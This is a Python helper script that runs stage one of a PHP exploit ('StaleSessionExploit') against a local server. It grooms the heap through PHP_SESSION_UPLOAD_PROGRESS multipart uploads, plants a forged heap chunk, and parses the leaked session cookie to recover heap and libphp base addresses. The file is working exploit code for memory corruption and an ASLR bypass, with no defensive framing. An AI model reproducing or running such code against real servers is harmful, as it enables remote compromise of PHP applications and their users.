#!/usr/bin/env python3
"""Debug helper: run the stage-1 producer/consumer and dump the Set-Cookie."""
import collections
import struct
import sys
import time

sys.path.insert(0, ".")
import exploit as E

target = E.HttpTarget("http://127.0.0.1:8088/index.php")
exploit = E.StaleSessionExploit(target)

exploit.rotate()

exploit._producer([{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)],
                  b"S" * 17, timeout=120)
time.sleep(0.2)

parts = [
    {"name": "PHPSESSID", "data": E.SESSION_ID},
    {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
]
for index in range(E.PROFILE.heap_fillers):
    parts.append({"name": str(1000 + index),
                  "data": (f"v{index:04d}" + "x" * 44)[:48].encode()})
forged = bytearray(b"A" * 79)
struct.pack_into("<Q", forged, 0x10, 0x1000)
forged[0x18] = ord("L")
parts.append({"name": "1999", "data": bytes(forged)})

response = target.post(E.build_multipart(parts, b"B" * 10), b"B" * 10, cap=9 << 20)
print("response bytes:", len(response))
print("--- first 1500 bytes ---")
print(response[:1500].decode("latin1", "replace"))
raw = E.session_cookie(response)
print("--- cookie len:", len(raw))
print("cookie first 96:", raw[:96].hex())
print("chunk base:", hex(E.chunk_base(raw)) if E.chunk_base(raw) else 0)
print("libphp base:", hex(E.libphp_base(raw, E.PROFILE.zval_ptr_dtor))
      if E.libphp_base(raw, E.PROFILE.zval_ptr_dtor) else 0)

votes = collections.Counter()
for index in range(len(raw) - 8):
    value = int.from_bytes(raw[index:index + 8], "little")
    if E.is_user_pointer(value):
        votes[value & ~0x1FFFFF] += 1
print("top candidate chunks:", [(hex(key), count) for key, count in votes.most_common(5)])
